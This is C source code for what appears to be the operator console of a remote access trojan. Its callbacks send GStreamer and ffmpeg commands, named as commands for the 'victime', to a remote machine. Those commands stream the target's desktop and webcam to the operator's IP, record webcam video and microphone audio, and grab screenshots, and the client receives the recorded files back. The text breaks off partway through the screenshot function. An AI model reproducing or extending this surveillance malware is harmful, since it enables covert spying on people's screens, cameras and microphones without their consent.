#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>  //gethostbyaddr()

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/callbacks_execute_commands.h"
#include "../includes/constants.h"
#include "../includes/utils.h"

//#include "../includes/stream_desktop.h"


extern GtkWidget *main_win;

extern const gchar *server_ip;
extern const gchar *server_port;
extern int port;
extern GtkWidget *text_view;

char *resolution_final = NULL;


void receive_remote_resolution()
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;

    size_t flag_resolution = 20;

    size_t final_reso_len = 0;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "receive_remote_resolution()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "receive_remote_resolution()");
        exit(-1);
    }

    printf("\t\tRECEIVING REMOTE RESOLUTION ...\n");

    if(send(sock, (char*)&flag_resolution, sizeof(flag_resolution), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "receive_remote_resolution()");
        exit(-1);
    }

    printf("\n\nflag sended : %zu\n\n", flag_resolution);


    if(recv(sock, (char*)&final_reso_len, sizeof(final_reso_len), 0) == SOCKET_ERROR)
    {
        error("send() final_reso_len", "receive_remote_resolution()");
        exit(-1);
    }

    printf("\n\nlen reso received : %zu\n\n", final_reso_len);

    resolution_final = malloc(final_reso_len * sizeof(char));
    if(resolution_final == NULL)
    {
        error("malloc() final_resolution", "receive_remote_resolution()");
        exit(-1);
    }

    if(recv(sock, resolution_final, final_reso_len, 0) == SOCKET_ERROR)
    {
        error("send() resolution_final", "receive_remote_resolution()");
        exit(-1);
    }

    printf("\n\nRemote Resolution is %s\n\n", resolution_final);

    return;
}

void cb_stream_remote_desktop(const gchar *IP)
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    FILE *pipe = NULL;

    GtkWidget *IP_dialog = NULL;
    GtkWidget *IP_entry = NULL;
    //char *IP = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    int err = 0;
    size_t flag_watch = 12;

    //const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=810,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=810,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    const gchar *command_user = "gst-launch-1.0 udpsrc port=4444 ! application/x-rtp,encoding-name=JPEG,payload=26 ! rtpjpegdepay ! jpegdec ! autovideosink";

    IP = malloc(15 * sizeof(char));
    if(IP == NULL)
    {
        error("malloc() IP", "ubuntu_streaming_watch()");
        exit(-1);
    }

    IP_dialog = gtk_dialog_new_with_buttons("Enter your IP", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, GTK_STOCK_CANCEL, GTK_RESPONSE_CANCEL, NULL);

    IP_entry = gtk_entry_new();

    gtk_entry_set_text(GTK_ENTRY(IP_entry), "Your IP");

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);

    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_OK:
            IP = gtk_entry_get_text(GTK_ENTRY(IP_entry));
            break;

        case GTK_RESPONSE_CANCEL:
            break;

        case GTK_RESPONSE_NONE:
            break;

        default:
            break;
    }

    final_victime_cmd = malloc(256 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_stream_remote_desktop()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strcat(final_victime_cmd, "host=");
    final_victime_cmd = strcat(final_victime_cmd, IP);
    final_victime_cmd = strcat(final_victime_cmd, " ");
    final_victime_cmd = strcat(final_victime_cmd, "port=");
    final_victime_cmd = strcat(final_victime_cmd, server_port);

    gtk_widget_destroy(IP_dialog);

    //usleep(400);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_stream_remote_desktop()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_stream_remote_desktop()");
        exit(-1);
    }

    printf("\t\tSTREAM STARTED ....\n");

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_stream_remote_desktop()");
        exit(-1);
    }

    if(flag_watch == 12)
    {
        pipe = popen(command_user, "r");
        if(pipe == NULL)
        {
            error("popen() pipe", "cb_stream_remote_desktop()");
            exit(-1);
        }

        if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
        {
            error("send() len_final_cmd", "cb_stream_remote_desktop()");
            exit(-1);
        }

        if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
        {
            error("send() final_victime_cmd", "cb_stream_remote_desktop()");
            exit(-1);
        }

        /** Obtaining the buffer associated with the widget. **/
        text_buffer = gtk_text_view_get_buffer((GtkTextView*)(text_view));

        /** Set the default buffer text. **/
        gtk_text_buffer_set_text(text_buffer, "Stream remote desktop started.", -1);

        /** Obtain iters for the start and end of points of the buffer **/
        gtk_text_buffer_get_start_iter(text_buffer, &start);
        gtk_text_buffer_get_end_iter(text_buffer, &end);

        /** Get the entire buffer text. **/
        text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

        /** Print the text **/
        g_print("%s", text);

    }

    free(final_victime_cmd);

    return;
}

void cb_stream_remote_webcam(const gchar *IP)
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    FILE *pipe = NULL;

    GtkWidget *IP_dialog = NULL;
    GtkWidget *IP_entry = NULL;
    //char *IP = NULL;

    int err = 0;
    size_t flag_watch = 18;

    // gst-launch-1.0 v4l2src device=/dev/video0 ! decodebin ! x264enc ! rtph264pay ! udpsink ;


    const gchar *command_victime_temp = "gst-launch-1.0 v4l2src device=/dev/video0 ! decodebin ! x264enc ! rtph264pay ! udpsink ";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    const gchar *command_user = "gst-launch-1.0 udpsrc port=4444 ! application/x-rtp,encoding-name=JPEG,payload=26 ! rtpjpegdepay ! jpegdec ! autovideosink";

    //gst-launch-1.0 udpsrc port=4444 ! application/x-rtp,encoding-name=JPEG,payload=26 ! rtpjpegdepay ! jpegdec ! autovideosink

    IP = malloc(15 * sizeof(char));
    if(IP == NULL)
    {
        error("malloc() IP", "cb_stream_remote_webcam()");
        exit(-1);
    }

    IP_dialog = gtk_dialog_new_with_buttons("Enter your IP", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, GTK_STOCK_CANCEL, GTK_RESPONSE_CANCEL, NULL);

    IP_entry = gtk_entry_new();

    gtk_entry_set_text(GTK_ENTRY(IP_entry), "Your IP");

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);

    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_OK:
            IP = gtk_entry_get_text(GTK_ENTRY(IP_entry));
            break;

        case GTK_RESPONSE_CANCEL:
            break;

        case GTK_RESPONSE_NONE:
            break;

        default:
            break;
    }

    final_victime_cmd = malloc(256 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_stream_remote_webcam()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strcat(final_victime_cmd, "host=");
    final_victime_cmd = strcat(final_victime_cmd, IP);
    final_victime_cmd = strcat(final_victime_cmd, " ");
    final_victime_cmd = strcat(final_victime_cmd, "port=");
    final_victime_cmd = strcat(final_victime_cmd, server_port);

    printf("\nfinal_victime_cmd = %s\n", final_victime_cmd);

    gtk_widget_destroy(IP_dialog);

    //usleep(400);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_stream_remote_webcam()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_stream_remote_webcam()");
        exit(-1);
    }

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_stream_remote_webcam()");
        exit(-1);
    }

    if(flag_watch == 18)
    {
        pipe = popen(command_user, "r");
        if(pipe == NULL)
        {
            error("popen() pipe", "cb_stream_remote_webcam()");
            exit(-1);
        }

        if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
        {
            error("send() len_final_cmd", "cb_stream_remote_webcam()");
            exit(-1);
        }

        if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
        {
            error("send() final_victime_cmd", "cb_stream_remote_webcam()");
            exit(-1);
        }
    }

    free(final_victime_cmd);

    return;
}


void cb_record_webcam(GtkButton *button, gpointer user_data)
{
    GtkWidget *number_frames_dialog = NULL;
    const gchar *number_of_frames = NULL;
    GtkWidget *frames_entry = NULL;

    GtkWidget *recording = NULL;

    GtkWidget *too_much_frames_dialog = NULL;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_watch = 14;

    char *buffer = NULL;

    FILE *record = NULL;

    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;

    GtkWidget *progress_bar_webcam = NULL;
    //GtkWidget *pbar_hbox = NULL;
    gdouble step_foreward  = 0.0;

    //gst-launch-1.0 -v v4l2src device=/dev/video0 num-buffers=500 ! "video/x-raw,width=1440,framerate=30/1" ! videorate ! "video/x-raw,framerate=30/1" ! jpegenc ! avimux ! filesink location=output.avi

    const gchar *command_victime_temp = "gst-launch-1.0 -v v4l2src device=/dev/video0 num-buffers=";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    number_of_frames = malloc(16 * sizeof(char));
    if(number_of_frames == NULL)
    {
        error("malloc() number_of_frames", "cb_record_webcam()");
        exit(-1);
    }

    /** PK MAX 5000 ???? **/
    number_frames_dialog = gtk_dialog_new_with_buttons("How many frames you want to record ? (500 ~ 2min / max 5000)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);
    gtk_widget_set_size_request(number_frames_dialog, 500, 100);

    frames_entry  = gtk_entry_new_with_max_length(8);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(number_frames_dialog)->vbox), frames_entry, TRUE, FALSE, 0);

    //pbar_hbox = gtk_hbox_new(TRUE, 0);
    progress_bar_webcam = gtk_progress_bar_new();
    gtk_widget_set_size_request(progress_bar_webcam, 130, 20);

    gtk_progress_set_format_string (GTK_PROGRESS(progress_bar_webcam), "%p%%");

    gtk_progress_set_show_text(GTK_PROGRESS(progress_bar_webcam), TRUE);

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(number_frames_dialog)->vbox), progress_bar_webcam, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(number_frames_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(number_frames_dialog)))
    {
        case GTK_RESPONSE_OK:
            number_of_frames = gtk_entry_get_text(GTK_ENTRY(frames_entry));
            if(atoi(number_of_frames) > 5000 || atoi(number_of_frames) < 1)
            {
                too_much_frames_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE, "You can't record so much frames !");
                gtk_widget_set_size_request(too_much_frames_dialog, 300, 100);

                gtk_widget_show_all(GTK_DIALOG(too_much_frames_dialog)->vbox);
                gtk_dialog_run(GTK_DIALOG(too_much_frames_dialog));

                gtk_widget_destroy(too_much_frames_dialog);
                gtk_widget_destroy(number_frames_dialog);
                return;
            }

            break;

        default:
            gtk_widget_destroy(number_frames_dialog);
            return;
    }

    final_victime_cmd = malloc(512 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_record_webcam()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strncat(final_victime_cmd, number_of_frames, strlen(number_of_frames));
    final_victime_cmd = strncat(final_victime_cmd, " ! video/x-raw,width=640,framerate=30/1 ! videorate ! video/x-raw,framerate=30/1 ! jpegenc ! avimux ! filesink location=output.avi", strlen(" ! video/x-raw,width=640,framerate=30/1 ! videorate ! video/x-raw,framerate=30/1 ! jpegenc ! avimux ! filesink location=output.avi") + 1);

    len_final_cmd = strlen(final_victime_cmd);

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_record_webcam()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_record_webcam()");
        exit(-1);
    }
    printf("\nConnected to server from record webcam\n");

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_record_webcam()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_record_webcam()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_record_webcam()");
        exit(-1);
    }

    record = fopen("Webcam_record/output.avi", "wb");
    if(record == NULL)
    {
        error("fopen() output.avi", "cb_record_webcam()");
        exit(-1);
    }

    if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("recv() data_len", "cb_record_webcam()");
        exit(-1);
    }

    buffer = malloc(data_len * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc buffer", "cb_record_webcam()");
        return;
    }

    printf("le fichier fait : %ld octets\n\n", data_len);

    do
    {
        tailleBlockRecut = recv(sock, buffer, data_len, 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, record);

        totalRcv += tailleBlockRecut;

        step_foreward = ((gdouble)totalRcv * 1.0) / (gdouble)data_len;

        if(step_foreward > 1.0)
            step_foreward = 0.0;

        gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_webcam), step_foreward);
        gtk_main_iteration();

    }while(totalRcv < data_len);

    gtk_grab_remove(number_frames_dialog);

    recording = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_NONE, "End of Record ...");
    gtk_widget_show_all(GTK_DIALOG(recording)->vbox);
    gtk_dialog_run(GTK_DIALOG(recording));
    gtk_widget_destroy(recording);

    gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_webcam), 0.0);
    gtk_grab_add(number_frames_dialog);

    //printf("Reception du fichier video success : %ld !!\n", totalRcv);

    free(final_victime_cmd);
    gtk_widget_destroy(number_frames_dialog);
    free(buffer);

    // unused parameters
    (void)button;
    (void)user_data;

    return;
}


void cb_record_micro(GtkButton *button, gpointer user_data)
{
    GtkWidget *ready_to_record = NULL;
    const gchar *time_of_record = NULL;
    GtkWidget *time_of_rec_dialog = NULL;
    GtkWidget *time_of_rec_entry = NULL;
    GtkWidget *time_too_long_dialog = NULL;

    GtkWidget *confirmation_script_dialog = NULL;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    int recorded = 0;
    size_t flag = 17;

    char buffer[BUFSIZ] = "";

    FILE *record = NULL;

    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;

    GtkWidget *progress_bar_micro = NULL;
    //GtkWidget *pbar_hbox = NULL;
    gdouble step_foreward  = 0.0;

    GtkWidget *select_src_dialog = NULL;
    GtkWidget *target_OS_entry = NULL;
    const gchar *target_OS = NULL;

    GtkWidget *check_input_dialog = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

     //"gst-launch-1.0 -v alsasrc num-buffers= 500 ! wavenc ! filesink location=output.wav"
    //gst-launch-1.0 -v pulsesrc num-buffers= 500 ! wavenc ! filesink location=output.wav


    select_src_dialog = gtk_dialog_new_with_buttons("Enter the target OS : Ubuntu/Mint/Kali/Debian/Fedora", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    gtk_widget_set_size_request(select_src_dialog, 360, 100);

    target_OS_entry  = gtk_entry_new();
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(select_src_dialog)->vbox), target_OS_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(select_src_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(select_src_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            target_OS = gtk_entry_get_text(GTK_ENTRY(target_OS_entry));
            gtk_widget_hide(select_src_dialog);
            break;

        default:
            gtk_widget_destroy(select_src_dialog);
            return;
    }


    if(memcmp(target_OS, "Ubuntu", 6) != 0 && memcmp(target_OS, "Mint", 4) != 0 && memcmp(target_OS, "Kali", 4) != 0 && memcmp(target_OS, "Debian", 6) != 0 && memcmp(target_OS, "Fedora", 6) != 0)
    {
        check_input_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_OK, "You did not entered a correct value ....");

        gtk_widget_show_all(GTK_DIALOG(check_input_dialog)->vbox);
        switch(gtk_dialog_run(GTK_DIALOG(check_input_dialog)))
        {
            case GTK_RESPONSE_OK:
                gtk_widget_destroy(check_input_dialog);
                return;

            default :
                gtk_widget_destroy(check_input_dialog);
                return;
        }
    }

    const gchar *command_victime_temp = "";

    if(strncmp(target_OS, "Ubuntu", 6) == 0 || strncmp(target_OS, "Kali", 4) == 0 || strncmp(target_OS, "Mint", 4) == 0)
        command_victime_temp = "gst-launch-1.0 -v alsasrc num-buffers=";

    if(strncmp(target_OS, "Debian", 6) == 0 || strncmp(target_OS, "Fedora", 6) == 0)
        command_victime_temp = "gst-launch-1.0 -v pulsesrc num-buffers=";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    time_of_record = malloc(16 * sizeof(char));
    if(time_of_record == NULL)
    {
        error("malloc() time_of_record", "cb_record_webcam()");
        exit(-1);
    }

    time_of_rec_dialog = gtk_dialog_new_with_buttons("How many time you want to record ? ((1000 ~ 10sec / on Debian & Fedora 1200 ~ 2min) / max = 60000)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);
    gtk_widget_set_size_request(time_of_rec_dialog, 670, 100);

    time_of_rec_entry  = gtk_entry_new_with_max_length(8);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_of_rec_dialog)->vbox), time_of_rec_entry, TRUE, FALSE, 0);

    //pbar_hbox = gtk_hbox_new(TRUE, 0);
    progress_bar_micro = gtk_progress_bar_new();
    gtk_widget_set_size_request(progress_bar_micro, 130, 10);

    gtk_progress_set_format_string (GTK_PROGRESS(progress_bar_micro), "%p%%");

    gtk_progress_set_show_text(GTK_PROGRESS(progress_bar_micro), TRUE);

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_of_rec_dialog)->vbox), progress_bar_micro, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(time_of_rec_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(time_of_rec_dialog)))
    {
        case GTK_RESPONSE_OK:
            time_of_record = gtk_entry_get_text(GTK_ENTRY(time_of_rec_entry));
            if(atoi(time_of_record) > 60000 || atoi(time_of_record) < 1)
            {
                time_too_long_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE, "You can't record so much time !");
                gtk_widget_set_size_request(time_too_long_dialog, 300, 100);

                gtk_widget_show_all(GTK_DIALOG(time_too_long_dialog)->vbox);
                gtk_dialog_run(GTK_DIALOG(time_too_long_dialog));

                gtk_widget_destroy(time_too_long_dialog);
                gtk_widget_destroy(time_of_rec_dialog);
                gtk_widget_destroy(select_src_dialog);
                return;
            }
            break;

        default:
            gtk_widget_destroy(time_of_rec_dialog);
            return;
    }

    ready_to_record = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready for recording audio ?");

    gtk_widget_show_all(GTK_DIALOG(ready_to_record)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(ready_to_record)))
    {
        case GTK_RESPONSE_YES:
             gtk_widget_destroy(ready_to_record);
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(ready_to_record);
            return;

        default :
            gtk_widget_destroy(ready_to_record);
            return;
    }

    final_victime_cmd = malloc(512 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_record_webcam()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strncat(final_victime_cmd, time_of_record, strlen(time_of_record));
    final_victime_cmd = strncat(final_victime_cmd, " ! wavenc ! filesink location=output.wav", 41);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = (uint16_t)atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_record_micro()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_record_micro()");
        exit(-1);
    }

    if(send(sock, (char*)&flag, sizeof(flag), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_record_micro()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_record_micro()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_record_micro()");
        exit(-1);
    }

    if(recv(sock, (char*)&recorded, sizeof(recorded), 0) == SOCKET_ERROR)
    {
        error("recv() recorded", "cb_record_micro()");
        exit(-1);
    }

    if(recorded == 1)
    {
        confirmation_script_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_NONE, "Audio have been recorded ...");

        switch(gtk_dialog_run(GTK_DIALOG(confirmation_script_dialog)))
        {
            default :
                gtk_widget_destroy(confirmation_script_dialog);
                break;
        }
    }


    record = fopen("output.mp3", "wb");
    if(record == NULL)
    {
        error("fopen() output.mp3", "cb_record_micro()");
        exit(-1);
    }

    if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("recv() data_len", "cb_record_micro()");
        exit(-1);
    }

    printf("le fichier fait : %ld octets\n\n", data_len);

    gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_micro), 0.0);

    gtk_grab_add(progress_bar_micro);
    do
    {
        tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, record);

        totalRcv += tailleBlockRecut;

        step_foreward = ((gdouble)totalRcv * 1.0) / (gdouble)data_len;

        if(step_foreward > 1.0)
            step_foreward = 0.0;

        gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_micro), step_foreward);
        gtk_main_iteration();

    }while(totalRcv < data_len);

    gtk_grab_remove(progress_bar_micro);

    printf("Reception du fichier audio success : %ld !!\n", totalRcv);

    gtk_widget_destroy(time_of_rec_dialog);
    gtk_widget_destroy(select_src_dialog);

    // Obtaining the buffer associated with the widget.
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);

    // Set the default buffer text.
    gtk_text_buffer_set_text(text_buffer, "Audio File have been downloaded ...", -1);

    // Obtain iters for the start and end of points of the buffer
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    // Get the entire buffer text.
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    // Print the text
    g_print("%s", text);
    g_free(text);

    // unused parameters
    (void)button;
    (void)user_data;

    return;
}

void cb_take_screenshot(GtkButton *button, gpointer user_data)
{

    GtkWidget *select_src_dialog = NULL;
    GtkWidget *target_OS_entry = NULL;
    const gchar *target_OS = NULL;
    GtkWidget *check_input_dialog = NULL;

   //const gchar *victime_cmd = "ffmpeg -f x11grab -framerate 1 -video_size 1920x1080 -i :0.0 -vframes 1 screenshot.jpeg";
    const gchar *victime_cmd = "ffmpeg -f x11grab -framerate 1 -video_size";
    size_t len_cmd = strlen(victime_cmd) + 1;

    char *final_victime_cmd = NULL;
    size_t len_final_cmd = 0;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    size_t flag_screenshot = 19;
    int err = 0;

    unsigned char buffer[1450] = "";

    FILE *screenshot_file = NULL;
    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;


    select_src_dialog = gtk_dialog_new_with_buttons("Enter the target OS : Ubuntu/Mint/Kali/Debian/Fedora", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    gtk_widget_set_size_request(select_src_dialog, 450, 100);

    target_OS_entry  = gtk_entry_new();
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(select_src_dialog)->vbox), target_OS_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(select_src_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(select_src_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            target_OS = gtk_entry_get_text(GTK_ENTRY(target_OS_entry));
            gtk_widget_hide(select_src_dialog);
            break;

        default:
            gtk_widget_destroy(select_src_dialog);
            return;
    }


    if(memcmp(target_OS, "Ubuntu", 6) != 0 && memcmp(target_OS, "Mint", 4) != 0 && memcmp(target_OS, "Kali", 4) != 0 && memcmp(target_OS, "Debian", 6) != 0 && memcmp(target_OS, "Fedora", 6) != 0)
    {
        check_input_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_OK, "You did not entered a correct value.");

        gtk_widget_show_all(GTK_DIALOG(check_input_dialog)->vbox);
